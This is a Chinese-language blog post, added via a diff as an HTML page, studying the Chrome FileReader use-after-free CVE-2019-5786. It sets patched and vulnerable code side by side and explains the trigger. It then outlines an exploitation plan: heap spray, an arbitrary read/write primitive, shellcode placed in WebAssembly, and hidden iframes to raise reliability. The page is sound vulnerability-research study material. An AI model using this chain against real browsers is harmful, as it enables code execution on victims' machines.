@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Wo0dsHole">
+  
+  
+  
+  <link rel="prev" href="https://Wo0dsHole.github.io/1/62-full-exploit-chain/" />
+  <link rel="next" href="https://Wo0dsHole.github.io/1993/1993/" />
+  <link rel="canonical" href="https://Wo0dsHole.github.io/1993/b0/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           CVE-2019-5786笔记 | 树洞
+       
+  </title>
+  <meta name="title" content="CVE-2019-5786笔记 | 树洞">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/Wo0dsHole.github.io\/"
+    },
+    "articleSection" : "posts",
+    "name" : "CVE-2019-5786笔记",
+    "headline" : "CVE-2019-5786笔记",
+    "description" : "CVE-2019-5786笔记 [TOC]\n0.参考blog阅读 链接：https:\/\/blog.exodusintel.com\/2019\/03\/20\/cve-2019-5786-analysis-and-exploitation\/\n这一部分基本是偏翻译性质的记录。\n0.补丁分析 Google的简略漏洞公告信息知：FileReader的 UAF漏洞。\n从MDN上了解 FileReader信息：\nFileReader可使 web应用程序异步地读取用户计算机上存储的文件内容（或raw data buffers）。\r借助 File或 Blob对象去读取指定的文件或数据。\r用于读取用户打开的文件对话框中的文件内容，或由 js代码创建的 Blobs。\n例子：\nlet reader = new FileReader(); reader.onloadend = function(evt) { console.log(`contents as an ArrayBuffer: ${evt.target.result}`); } reader.onprogress = function(evt) { console.log(`read ${evt.target.result.byteLength}bytes so far`); } let contents = \u0026#34;filecontents\u0026#34;; f = new File([contents], \u0026#34;a.txt\u0026#34;); reader.readAsArrayBuffer(f); 重点在于：\n File或 Blob内容是异步读取的 进程通过回调来通知用户 js代码  onprogress事件可能会被触发多次，当进程在读取、访问当前读取的内容时。\nonloadend事件只在操作完成时被触发一次，不管操作是成功或失败。\n补丁代码中只修改了一个函数，如下：\nvul:\nDOMArrayBuffer* FileReaderLoader::ArrayBufferResult() { DCHECK_EQ(read_type_, kReadAsArrayBuffer); if (array_buffer_result_) return array_buffer_result_; \/\/ If the loading is not started or an error occurs, return an empty result.",
+    "inLanguage" : "en-us",
+    "author" : "Wo0dsHole",
+    "creator" : "Wo0dsHole",
+    "publisher": "Wo0dsHole",
+    "accountablePerson" : "Wo0dsHole",
+    "copyrightHolder" : "Wo0dsHole",
+    "copyrightYear" : "1993",
+    "datePublished": "1993-03-13 00:00:00 \u002b0800 CST",
+    "dateModified" : "1993-03-13 00:00:00 \u002b0800 CST",
+    "url" : "https:\/\/Wo0dsHole.github.io\/1993\/b0\/",
+    "wordCount" : "1345",
+    "keywords" : [ "Chrome漏洞", "树洞"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://Wo0dsHole.github.io/">树洞</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://Wo0dsHole.github.io/">树洞</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">CVE-2019-5786笔记</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://Wo0dsHole.github.io/" rel="author">Wo0dsHole</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=1993-03-13 itemprop="datePublished">March 13, 1993</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="cve-2019-5786笔记">CVE-2019-5786笔记</h1>
+<p>[TOC]</p>
+<h2 id="0参考blog阅读">0.参考blog阅读</h2>
+<p>链接：https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/</p>
+<p>这一部分基本是偏翻译性质的记录。</p>
+<h3 id="0补丁分析">0.补丁分析</h3>
+<p><a href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html">Google的简略漏洞公告信息</a>知：FileReader的 UAF漏洞。</p>
+<p>从<a href="https://developer.mozilla.org/en-US/docs/Web/API/FileReader">MDN</a>上了解 FileReader信息：</p>
+<pre><code>FileReader可使 web应用程序异步地读取用户计算机上存储的文件内容（或raw data buffers）。
+借助 File或 Blob对象去读取指定的文件或数据。
+</code></pre><p>用于读取用户打开的文件对话框中的文件内容，或由 js代码创建的 Blobs。</p>
+<p>例子：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">reader</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileReader</span>();
+
+<span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">onloadend</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">evt</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`contents as an ArrayBuffer: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">evt</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+}
+
+<span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">onprogress</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">evt</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`read </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">evt</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">byteLength</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes so far`</span>);
+}
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">contents</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;filecontents&#34;</span>;
+<span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>([<span style="color:#a6e22e">contents</span>], <span style="color:#e6db74">&#34;a.txt&#34;</span>);
+<span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">readAsArrayBuffer</span>(<span style="color:#a6e22e">f</span>);
+</code></pre></div><p>重点在于：</p>
+<ul>
+<li>File或 Blob内容是异步读取的</li>
+<li>进程通过回调来通知用户 js代码</li>
+</ul>
+<p>onprogress事件可能会被触发多次，当进程在读取、访问当前读取的内容时。</p>
+<p>onloadend事件只在操作完成时被触发一次，不管操作是成功或失败。</p>
+<p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/1492873">补丁代码</a>中只修改了一个函数，如下：</p>
+<p>vul:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DOMArrayBuffer<span style="color:#f92672">*</span> FileReaderLoader<span style="color:#f92672">::</span>ArrayBufferResult() {
+  DCHECK_EQ(read_type_, kReadAsArrayBuffer);
+  <span style="color:#66d9ef">if</span> (array_buffer_result_)
+    <span style="color:#66d9ef">return</span> array_buffer_result_;
+
+  <span style="color:#75715e">// If the loading is not started or an error occurs, return an empty result.
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>raw_data_ <span style="color:#f92672">||</span> error_code_ <span style="color:#f92672">!=</span> FileErrorCode<span style="color:#f92672">::</span>kOK)
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nullptr</span>;
+
+  DOMArrayBuffer<span style="color:#f92672">*</span> result <span style="color:#f92672">=</span> DOMArrayBuffer<span style="color:#f92672">::</span>Create(raw_data_<span style="color:#f92672">-&gt;</span>ToArrayBuffer());
+  <span style="color:#66d9ef">if</span> (finished_loading_) {
+    array_buffer_result_ <span style="color:#f92672">=</span> result;
+    AdjustReportedMemoryUsageToV8(
+        <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">&gt;</span>(raw_data_<span style="color:#f92672">-&gt;</span>ByteLength()));
+    raw_data_.reset();
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>patched:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DOMArrayBuffer<span style="color:#f92672">*</span> FileReaderLoader<span style="color:#f92672">::</span>ArrayBufferResult() {
+  DCHECK_EQ(read_type_, kReadAsArrayBuffer);
+  <span style="color:#66d9ef">if</span> (array_buffer_result_)
+    <span style="color:#66d9ef">return</span> array_buffer_result_;
+
+  <span style="color:#75715e">// If the loading is not started or an error occurs, return an empty result.
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>raw_data_ <span style="color:#f92672">||</span> error_code_ <span style="color:#f92672">!=</span> FileErrorCode<span style="color:#f92672">::</span>kOK)
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nullptr</span>;
+
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>finished_loading_) {
+    <span style="color:#66d9ef">return</span> DOMArrayBuffer<span style="color:#f92672">::</span>Create(
+        ArrayBuffer<span style="color:#f92672">::</span>Create(raw_data_<span style="color:#f92672">-&gt;</span>Data(), raw_data_<span style="color:#f92672">-&gt;</span>ByteLength()));
+  }
+
+  array_buffer_result_ <span style="color:#f92672">=</span> DOMArrayBuffer<span style="color:#f92672">::</span>Create(raw_data_<span style="color:#f92672">-&gt;</span>ToArrayBuffer());
+  AdjustReportedMemoryUsageToV8(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span>
+                                <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">&gt;</span>(raw_data_<span style="color:#f92672">-&gt;</span>ByteLength()));
+  raw_data_.reset();
+  <span style="color:#66d9ef">return</span> array_buffer_result_;
+}
+</code></pre></div><p>每次在 js代码调用 FileReader.readAsArrayBuffer后的回调中，访问 result属性时此函数会被调用。</p>
+<p>ArrayBuffer相关的 C++实现的对象层次结构相当复杂，其中重要的片段列举如下：</p>
+<p>（注意不同类的 C++命名空间，以方便区分实现于 Chromium（命名空间：WTF、blink）和 v8（命名空间：v8）的对象。）</p>
+<pre><code>WTF::ArrayBuffer
+	Chromium端对 ArrayBuffer概念的实现；
+	WTF::ArrayBuffer对象被引用计数，含有一个原始指针，指向它所底层对应的内存 buffer；
+	当 ArrayBuffer的引用计数为 0时，WTF::ArrayBuffer会被释放。
+blink::DOMArrayBufferBase
+	一个垃圾回收类，含有一个指向 WTF::ArrayBuffer的 smart指针。
+blink::DOMArrayBuffer
+	继续于 blink::DOMArrayBufferBase的类，在 Chromium中描述一个 ArrayBuffer；
+	在 js引擎中由一个 v8::internal::JSArrayBuffer实例表示。
+WTF::ArrayBufferBuilder
+	以增量的方式构造 WTF::ArrayBuffer的辅助类；
+	维护一个指向 ArrayBuffer的 smart指针。
+blink::FileReaderLoader
+	负责加载 File或 Blob内容；
+	使用 WTF::ArrayBufferBuilder在读取数据时构建 ArrayBuffer。
+</code></pre><p>补丁对比差异：</p>
+<p>若加载没完成 ——</p>
+<ul>
+<li>patched：用 ArrayBuffer::Create创建一个新的 ArrayBuffer对象作为参数，传给 DOMArrayBuffer::Create函数，此函数作为返回。</li>
+<li>vul：直接用一个对已存在的 ArrayBuffer的引用作为参数，传给 DOMArrayBuffer::Create函数，函数结果作为返回。</li>
+</ul>
+<p>ToArrayBuffer总是返回正在构建的 ArrayBuffer的实际状态。但由于读取是异步的，它可能在某些情况下返回相同值。</p>
+<p>什么情况下？</p>
+<p>raw_data变量的类型是 ArrayBufferBuilder，它用于构建返回的 ArrayBuffer，通过增量式的读取数据并按需动态的分配更大的 ArrayBuffer。</p>
+<p>ToArrayBuffer方法，返回指向底层 ArrayBuffer的 smart指针。指向当前读取的内容占满了分配的 buffer，或者buffer没有耗尽通过切片的方式创建新的 buffer。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">scoped_refptr<span style="color:#f92672">&lt;</span>ArrayBuffer<span style="color:#f92672">&gt;</span> ArrayBufferBuilder<span style="color:#f92672">::</span>ToArrayBuffer() {
+  <span style="color:#75715e">// Fully used. Return m_buffer as-is.
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (buffer_<span style="color:#f92672">-&gt;</span>ByteLength() <span style="color:#f92672">==</span> bytes_used_)
+    <span style="color:#66d9ef">return</span> buffer_;
+
+  <span style="color:#66d9ef">return</span> buffer_<span style="color:#f92672">-&gt;</span>Slice(<span style="color:#ae81ff">0</span>, bytes_used_);
+}
+</code></pre></div><p>一种对同一 ArrayBuffer多重引用的滥用方法，是通过一个引用来（detach）分离 ArrayBuffer并通过使用其他引用来造成悬挂（dangling）指针。</p>
+<pre><code>postMessage()方法可用于向 JS Worker传递消息。
+而它具有一个额外的参数，transfer，一组 Transferable对象，将其所有权转移给 Worker。
+</code></pre><p>transfer由 blink::SerializedScriptValue::TransferArrayBufferContents完成：</p>
+<pre><code>遍历由 postMessage的 transfer参数提供的 DOMArrayBuffers，对每一个调用 Transfer方法。
+</code></pre><p>从源码可知：</p>
+<p>blink::DOMArrayBuffer::Transfer调用 WTF::ArrayBuffer::Transfer，将底层数据 buffer的所有权转移。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">SerializedScriptValue<span style="color:#f92672">::</span>TransferArrayBufferContents(
+...
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span><span style="color:#f92672">*</span> it <span style="color:#f92672">=</span> array_buffers.begin(); it <span style="color:#f92672">!=</span> array_buffers.end(); <span style="color:#f92672">++</span>it) {
+  DOMArrayBufferBase<span style="color:#f92672">*</span> array_buffer_base <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>it;
+  <span style="color:#66d9ef">if</span> (visited.Contains(array_buffer_base))
+    <span style="color:#66d9ef">continue</span>;
+  visited.insert(array_buffer_base);
+
+  wtf_size_t index <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>wtf_size_t<span style="color:#f92672">&gt;</span>(std<span style="color:#f92672">::</span>distance(array_buffers.begin(), it));
+  ...
+  DOMArrayBuffer<span style="color:#f92672">*</span> array_buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>DOMArrayBuffer<span style="color:#f92672">*&gt;</span>(array_buffer_base);
+
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>array_buffer<span style="color:#f92672">-&gt;</span>Transfer(isolate, contents.at(index))) {
+    exception_state.ThrowDOMException(DOMExceptionCode<span style="color:#f92672">::</span>kDataCloneError,
+      <span style="color:#e6db74">&#34;ArrayBuffer at index &#34;</span> <span style="color:#f92672">+</span>
+      String<span style="color:#f92672">::</span>Number(index) <span style="color:#f92672">+</span>
+      <span style="color:#e6db74">&#34; could not be transferred.&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ArrayBufferContentsArray</span>();
+  }
+}
+</code></pre></div><p>漏洞触发：</p>
+<p>将引用同一底层 ArrayBuffer的多个 blink::DOMArrayBuffers传给 postMessage。对第一个的 buffer所有权转移会成功，随后的将失败，因为它底层的 ArrayBuffer已经 neutered。</p>
+<p>这导致 blink::SerializedScriptValue::TransferArrayBufferContents进入一个错误路径，释放以 transferred的 ArrayBuffer，但留下了对第二个 blink::DOMArrayBuffer的 dangling引用，通过在 js代码中使用它可以访问已释放的内存。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">SerializedScriptValue<span style="color:#f92672">::</span>TransferArrayBufferContents(
+...
+<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span><span style="color:#f92672">*</span> it <span style="color:#f92672">=</span> array_buffers.begin(); it <span style="color:#f92672">!=</span> array_buffers.end(); <span style="color:#f92672">++</span>it) {
+  DOMArrayBufferBase<span style="color:#f92672">*</span> array_buffer_base <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>it;
+  <span style="color:#66d9ef">if</span> (visited.Contains(array_buffer_base))
+    <span style="color:#66d9ef">continue</span>;
+  visited.insert(array_buffer_base);
+
+  wtf_size_t index <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>wtf_size_t<span style="color:#f92672">&gt;</span>(std<span style="color:#f92672">::</span>distance(array_buffers.begin(), it));
+  ...
+  DOMArrayBuffer<span style="color:#f92672">*</span> array_buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>DOMArrayBuffer<span style="color:#f92672">*&gt;</span>(array_buffer_base);
+
+  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>array_buffer<span style="color:#f92672">-&gt;</span>Transfer(isolate, contents.at(index))) {
+    exception_state.ThrowDOMException(DOMExceptionCode<span style="color:#f92672">::</span>kDataCloneError,
+      <span style="color:#e6db74">&#34;ArrayBuffer at index &#34;</span> <span style="color:#f92672">+</span>
+      String<span style="color:#f92672">::</span>Number(index) <span style="color:#f92672">+</span>
+      <span style="color:#e6db74">&#34; could not be transferred.&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ArrayBufferContentsArray</span>();
+  }
+}
+</code></pre></div><h3 id="1利用思路">1.利用思路</h3>
+<p>漏洞可转化为任意读/写原语：通过 JS TypedArrays来再次使用 dangling指针指向的内存区域，并控制其长度字段、backing store pointers。</p>
+<p>然后进一步利用，实现 renderer进程中的任意代码执行。</p>
+<h3 id="2chrome内存管理">2.Chrome内存管理</h3>
+<p>有几个 Chrome的内存管理方面的因素会影响漏洞的可靠性。</p>
+<p>Chrome使用 <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/base/allocator/partition_allocator/PartitionAlloc.md">PartitionAlloc</a>来分配存储 ArrayBuffers，这有效的将 ArrayBuffer和其他种类的分配隔离。</p>
+<ul>
+<li>
+<p>若释放的内存块小于 2MB，漏洞将不能利用。因为 PartitionAlloc不会将这些分配重用于其他种类的数据。</p>
+</li>
+<li>
+<p>若内存块大于 2MB，它将被放置于直接映射区域。一旦释放，其他种类的分配可以重用这个内存块。</p>
+</li>
+</ul>
+<p>但是，只能在 32位平台下成功的重用释放的内存块。PartitionAlloc会在64位平台 ASLR之上，通过 VirtualAlloc和 mmap进一步增强随机化分配。</p>
+<p>Windows 7 32位下，一个新 Chrome进程的地址空间近似如下：</p>
+<pre><code>...
+45f5000  45f8000     3000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE           &lt;unknown&gt;  [................]
+45f8000  4600000     8000 MEM_PRIVATE MEM_RESERVE                          &lt;unknown&gt;  
+4600000  24600000 20000000 MEM_PRIVATE MEM_RESERVE                         &lt;unknown&gt;  
+24600000 24601000     1000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE          &lt;unknown&gt;  [...............j]
+24601000 24602000     1000 MEM_PRIVATE MEM_RESERVE                         &lt;unknown&gt;  
+...
+36681000 36690000     f000 MEM_PRIVATE MEM_RESERVE                         &lt;unknown&gt;  
+36690000 65fc0000 2f930000             MEM_FREE    PAGE_NOACCESS           Free      
+65fc0000 65fc1000     1000 MEM_IMAGE   MEM_COMMIT  PAGE_READONLY           Image      [dbghelp; &quot;C:\Windows\system32\dbghelp.dll&quot;]
+65fc1000 66085000    c4000 MEM_IMAGE   MEM_COMMIT  PAGE_EXECUTE_READ       Image      [dbghelp; &quot;C:\Windows\system32\dbghelp.dll&quot;]
+66085000 66086000     1000 MEM_IMAGE   MEM_COMMIT  PAGE_READWRITE          Image      [dbghelp; &quot;C:\Windows\system32\dbghelp.dll&quot;]
+...
+</code></pre><p>受 Windows ASLR机制的影响，这些地址并不是静态的。</p>
+<p>从地址空间的下端开始自底向上分配，最后一个 reserved块开始于 36681000。</p>
+<p>Windows堆、PartitionAlloc块、v8和Chrome的垃圾回收堆、线程栈都自底向上的形式布置于这些区域。漏洞相关的 ArrayBuffer也不例外。</p>
+<p>关键点在于 Chrome在早期进行了 512MB的 reserved分配（从4600000开始）。</p>
+<p>这是因为 x86 Windows的地址空间紧凑、碎片化很快。因此，Chrome预留这块分配，以便可以进行大而连续的分配，如 ArrayBuffers。若 ArrayBuffer分配失败，Chrome将释放这块 reserved块，尝试再次分配。</p>
+<p>这一处理逻辑使得利用变得复杂。</p>
+<p>首先要尝试分配一个大的（1GB）ArrayBuffer。这导致 Chrome去释放 reserved块，然后再次分配失败，因为地址空间中没有符合要求大小的空隙。尽管大多数 OOM（out-of-memory）情况会杀死 renderer process，但 失败的ArrayBuffer分配可以通过 JS的异常处理（EH） 恢复。</p>
+<p>另一个关键因素，是 Chrome堆管理中涉及到的多重垃圾回收的不确定特性。这使得通过 JS来控制地址空间变得困难。</p>
+<p>由于触发漏洞的 onprogress事件的触发也是次数不定的，事件的每次触发都会导致内存分配，没有通过 JS手动触发垃圾回收的能力，那么最后漏洞 ArrayBuffer的位置是不可控的。</p>
+<p>利用中使用下面的代码触发垃圾回收：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">force_gc</span>() {
+  <span style="color:#75715e">// forces a garbage collection to avoid OOM kills and help with heap non-determinism
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">try</span> {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">failure</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Memory</span>({<span style="color:#a6e22e">initial</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">32767</span>});
+  } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+    <span style="color:#75715e">// console.log(e.message);
+</span><span style="color:#75715e"></span>  }
+}
+</code></pre></div><p>这使得连续释放 onprogress事件的 result成为可能，避免了 OOM杀死 renderer进程，也强制使得 dangling指针指向地址空间的下端，即开始处 512MB的 reserved块中的某个位置。</p>
+<h3 id="3具体利用步骤">3.具体利用步骤</h3>
+<ol>
+<li>分配一个大（128MB）字符串，将作为传给 FileReader的 Blob的 source。这一分配将结束于自底向上分配的 free区域（即从 36690000开始的地址空间）</li>
+<li>通过超大的 ArrayBuffer分配来释放 512MB的 reserved块，如上面所说。</li>
+<li>调用 FileReader.readAsArrayBuffer。若干 onprogress事件将被触发，如果时间的时间正确，那么最后两个返回的引用将是对于同一底层 ArrayBuffer的。只要进程不崩溃，这一步可以重复多次直到成功。</li>
+<li>通过一个引用释放 ArrayBuffer，另一个即可用于访问 dangling指针。</li>
+<li>堆喷可识别的、含有 TypedArray的 JS对象来重用释放的区域。</li>
+<li>通过 dangling引用查找可识别标志。这可以泄漏任意对象的地址，将它们设置为找到对象的 property，通过 dangling指针来读取这些 property值。</li>
+<li>控制堆喷的一个 TypedArray，实现对地址空间的任意读写。</li>
+<li>加载一个 WebAssembly模块。这会映射一个可读可写可执行的 64KB内存区域到地址空间中。</li>
+<li>通过任意地址读写，遍历从WebAssembly模块导出的函数的JSFunction对象层次结构，以获取到 RWE内存区域。</li>
+<li>用 shellcode替换 WebAssembly函数的代码，通过调用此函数来执行它。</li>
+</ol>
+<h3 id="4可靠性提升">4.可靠性提升</h3>
+<p>通过上述步骤完成的 exp，单次成功概率大概 25%。但是有办法将其提升到 100%。<a href="https://blog.exodusintel.com/2019/01/22/exploiting-the-magellan-bug-on-64-bit-chrome-desktop/">另一篇文章</a>中描述的滥用 site隔离特性，“Making a Stealth Exploit by abusing Chrome’s Site Isolation”一节。</p>
+<p>每个 site对应一个（scheme:host）元组。因此，在一个站点上托管强制包装器脚本(该脚本在iframe中反复加载来自另一个主机的漏洞)将导致为每次漏洞尝试创建新进程。而这些iframe可以对用户隐藏，从而具有隐蔽性。</p>
+<p>使用多个站点来托管利用代码，可以并行化进程(受内存和站点隔离进程限制)。开发的漏洞使用保守的超时时间：10秒，每次迭代不并行，完成代码执行平均时间不到半分钟。</p>
+<h3 id="5完整exp">5.完整exp</h3>
+<p>链接：https://github.com/exodusintel/CVE-2019-5786</p>
+<h2 id="1自我实践">1.自我实践</h2>
+<p>对于 Nday，学习的意义在于两点：</p>
+<ul>
+<li>相关漏洞软件的内部机制积累：内存管理、对象结构、保护机制绕过。</li>
+<li>对比自己缺少的能力：换位脑补，在有“参考答案”的情况下，练习尝试。</li>
+</ul>
+<p>对于第2点，最终极的能力是自己能够独立研究清楚第1点中的那些软件机制。</p>
+<p>这一部分主要是解读 exp代码，将其与 blog内容对应，同时进行一些自己的实践、思考、提问。</p>
+<h3 id="0函数调用关系">0.函数调用关系</h3>
+<pre><code>exploit
+  init					
+	reader.onloadend
+	  force_gc
+	  get_rw				
+	    force_gc      
+	    reclaim_mixed    
+	    find_pattern       
+	    get_obj_idx       
+	    get_corruptable_ui32a  
+		  addrof          
+		  ta_read        
+	  rce
+	    get_wasm_func
+	    addrof        
+	    read4
+		  ta_read          
+		  ta_write          
+	    write4
+		  ta_read
+		  ta_write
+    reader.onprogress
+    allocate_spray_holders //2MB       
+    clear_spray    
+	//alloc 1GB ArrayBuffer
+    force_gc      
+  reader.readAsArrayBuffer(f)
+  console.log
+</code></pre><p>漏洞利用都在 init()中，reader.readAsArrayBuffer()是最终的触发。</p>
+<h3 id="1执行顺序">1.执行顺序</h3>
+<p>上面的写法顺序可能会带来疑惑，明明调用 reader.readAsArrayBuffer()是漏洞利用的第3步，但是整个漏洞利用却在 init()中，那么执行顺序是什么呢？</p>
+<p>其实这和面向对象（OOP）有关，OOP将事物看成是对象，对象中有一些固有的数据变量，对象中还有操作这些数据变量的行为，关键在于操作往往不止改变一个数据变量，而这些被更新的数据又存在顺序要求，于是 OOP就是用于对这种现象建模。</p>
+<p>这里和 FileReader相关的东西有3个：readArrayBuffer、onprogress、onloadend。它们在 JS中第1个称为 方法，后两者称为 属性。属性就相当于 OOP中的数据变量，方法是操作。从 OOP的原理来看，对数据变量的设置与方法没有因果关系。相反的是，这里数据变量设置好了之后，方法对其进行触发，JS中称为回调。</p>
+<p>对于数据变量的设置，学过函数式编程比较好理解，变量只是一个引用，数据和过程没什么区别，所以对数据变量的设置可以是将其与一系列过程关联起来，并不一定要是数值。毕竟变量只是一个引用。</p>
+<p>还有一个写法上的迷惑是 onprogress、onloadend，写在后面的 onprogress是先触发多次的， 写在前面的onloadend最后触发一次。</p>
+<p>实际执行顺序是：</p>
+<p>顶层代码 -&gt; 进入exploit() -&gt; init()函数体代码（onprogress、onloadend只是设置，没有触发执行） -&gt; 返回exploit() -&gt; reader.readAsArrayBuffer() -&gt; 触发onprogress事件 -&gt; 触发onloadend事件 -&gt; &hellip;&hellip;</p>
+<h3 id="2顶层代码">2.顶层代码</h3>
+<p>定义了一个全局变量：略</p>
+<p>对应Step1：</p>
+<p>分配一个大（128MB）字符串，将作为传给 FileReader的 Blob的 source。这一分配将结束于自底向上分配的 free区域（即从 36690000开始的地址空间）</p>
